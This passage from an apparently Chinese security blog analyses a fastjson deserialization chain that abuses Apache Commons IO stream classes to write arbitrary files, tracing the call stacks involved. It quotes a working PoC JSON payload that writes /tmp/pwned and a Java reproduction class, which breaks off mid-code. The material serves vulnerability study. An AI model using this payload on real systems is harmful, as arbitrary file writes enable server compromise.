class="hljs-string">&quot;charset&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bufferSize&quot;</span>: <span class="hljs-number">1024</span>,<br>      <span class="hljs-string">&quot;writeImmediately&quot;</span>: <span class="hljs-literal">true</span><br>    &#125;,<br>    <span class="hljs-string">&quot;closeBranch&quot;</span>:<span class="hljs-literal">true</span><br>  &#125;,<br>  <span class="hljs-string">&quot;httpContentType&quot;</span>:<span class="hljs-string">&quot;text/xml&quot;</span>,<br>  <span class="hljs-string">&quot;lenient&quot;</span>:<span class="hljs-literal">false</span>,<br>  <span class="hljs-string">&quot;defaultEncoding&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>XmlStreamReader 的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">XmlStreamReader</span><span class="hljs-params">(InputStream is, String httpContentType,</span><br><span class="hljs-params">                       <span class="hljs-type">boolean</span> lenient, String defaultEncoding)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">this</span>.defaultEncoding = defaultEncoding;<br>    <span class="hljs-comment">// 根据传进来的参数 is  封装 BOMInputStream</span><br>    <span class="hljs-type">BOMInputStream</span> <span class="hljs-variable">bom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BOMInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is, BUFFER_SIZE), <span class="hljs-literal">false</span>, BOMS);<br>    <span class="hljs-type">BOMInputStream</span> <span class="hljs-variable">pis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BOMInputStream</span>(bom, <span class="hljs-literal">true</span>, XML_GUESS_BYTES);<br>    <span class="hljs-comment">// 调用本类的 doHttpStream 方法</span><br>    <span class="hljs-built_in">this</span>.encoding = doHttpStream(bom, pis, httpContentType, lenient);<br>    <span class="hljs-built_in">this</span>.reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pis, encoding);<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">doHttpStream</span><span class="hljs-params">(BOMInputStream bom, BOMInputStream pis, String httpContentType,</span><br><span class="hljs-params">                            <span class="hljs-type">boolean</span> lenient)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// 调用getBOMCharsetName方法</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">bomEnc</span>      <span class="hljs-operator">=</span> bom.getBOMCharsetName();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xmlGuessEnc</span> <span class="hljs-operator">=</span> pis.getBOMCharsetName();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xmlEnc</span> <span class="hljs-operator">=</span> getXmlProlog(pis, xmlGuessEnc);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> calculateHttpEncoding(httpContentType, bomEnc,<br>                                     xmlGuessEnc, xmlEnc, lenient);<br>    &#125; <span class="hljs-keyword">catch</span> (XmlStreamReaderException ex) &#123;<br>        <span class="hljs-keyword">if</span> (lenient) &#123;<br>            <span class="hljs-keyword">return</span> doLenientDetection(httpContentType, ex);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bom.getBOMCharsetName &#x3D;&gt; getBOM &#x3D;&gt; in.read() 这个我们在分析 BOMInputStream 读文件的时候，也有说到</p><p>我们给 in 赋值为 TeeInputStream , 他接受两个参数 输入流 input 和输出了 branch，而他的 read 方法里执行了 write 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TeeInputStream</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">final</span> InputStream input, <span class="hljs-keyword">final</span> OutputStream branch, <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> closeBranch)</span> &#123;<br>    <span class="hljs-built_in">super</span>(input);<br>    <span class="hljs-built_in">this</span>.branch = branch;<br>    <span class="hljs-built_in">this</span>.closeBranch = closeBranch;<br>&#125;<br><span class="hljs-comment">// TeeInputStream 的 read 方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] bts, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> st, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> end)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.read(bts, st, end);<br>    <span class="hljs-keyword">if</span> (n != EOF) &#123;<br>        branch.write(bts, st, n);<br>    &#125;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里 TeeInputStream 相当于是我们写文件的桥梁，他把我们 (InputStream ) 读取到的字节流，写进了 (OutputStream ) 输出的字节流，也正是因为有这一特性，我们才能进行任意文件的写入</p></blockquote><p>后面就是inpu t为 ReaderInputStream + CharSequenceReader 控制读取的内容</p><p>branch为 WriterOutputStream + FileWriterWithEncoding 控制写文件的路径</p><p>我们简单调试一下</p><h5 id="读取调用栈"><a href="#读取调用栈" class="headerlink" title="读取调用栈"></a>读取调用栈</h5><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327153036531.png" alt="image-20250327153036531"></p><p>拿出来看一下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">read</span>:<span class="hljs-number">112</span>, CharSequenceReader (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">213</span>, ReaderInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">99</span>, ProxyInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">127</span>, TeeInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>fill:<span class="hljs-number">252</span>, BufferedInputStream (java.<span class="hljs-built_in">io</span>)<br><span class="hljs-built_in">read</span>:<span class="hljs-number">271</span>, BufferedInputStream (java.<span class="hljs-built_in">io</span>)<br>getBOM:<span class="hljs-number">174</span>, BOMInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>getBOMCharsetName:<span class="hljs-number">200</span>, BOMInputStream (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>doHttpStream:<span class="hljs-number">439</span>, XmlStreamReader (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br>&lt;init&gt;:<span class="hljs-number">326</span>, XmlStreamReader (org.apache.commons.<span class="hljs-built_in">io</span>.<span class="hljs-built_in">input</span>)<br></code></pre></td></tr></table></figure><h5 id="写入调用栈"><a href="#写入调用栈" class="headerlink" title="写入调用栈"></a>写入调用栈</h5><p>读取完成后，我们会回到org.apache.commons.io.input.TeeInputStream#read(byte[], int, int) 执行 write() 函数</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327153334028.png" alt="image-20250327153334028"></p><p>最终到 sun.nio.cs.StreamEncoder#implWrite(java.nio.CharBuffer) 执行写文件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327155323240.png" alt="image-20250327155323240"></p><p>我们的输入字节流就只有几个 a 字符， 肯定是不满足缓冲区溢出的。</p><p>可以看到我们的文件是没有内容的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327160437723.png" alt="image-20250327160437723"></p><h5 id="解决缓冲区问题"><a href="#解决缓冲区问题" class="headerlink" title="解决缓冲区问题"></a>解决缓冲区问题</h5><p>那我们要怎么解决这个问题呢？</p><p>你是不是像到我们把字符串写多一点不就行了</p><p>很可惜，这是不可行的。以为在传入的输入流和输出流对缓冲区大小做了限制</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327160326236.png" alt="image-20250327160326236"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327160100829.png" alt="image-20250327160100829"></div></div></div><p><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅已经给出了答案，利用<code>$ref</code> 引用特性循环输入解决这一问题，师傅公开的POC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/pwned&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;encoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XmlWriteFile</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">4096</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;a&quot;</span>.repeat(count) +<span class="hljs-string">&quot;\n&quot;</span>+ <span class="hljs-string">&quot;b&quot;</span>.repeat(count)+<span class="hljs-string">&quot;c&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.ReaderInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;reader\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;charSequence\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.String\&quot; \&quot;&quot;</span>+ content +<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;bufferSize\&quot;:1024\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;writer\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;file\&quot;:\&quot;D:/WebSafe/JavaProject/fastjson/src/main/java/com/lingx5/poc/2.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;encoding\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;append\&quot;: false\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;bufferSize\&quot;: 1024,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;writeImmediately\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;trigger\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.XmlStreamReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;is\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          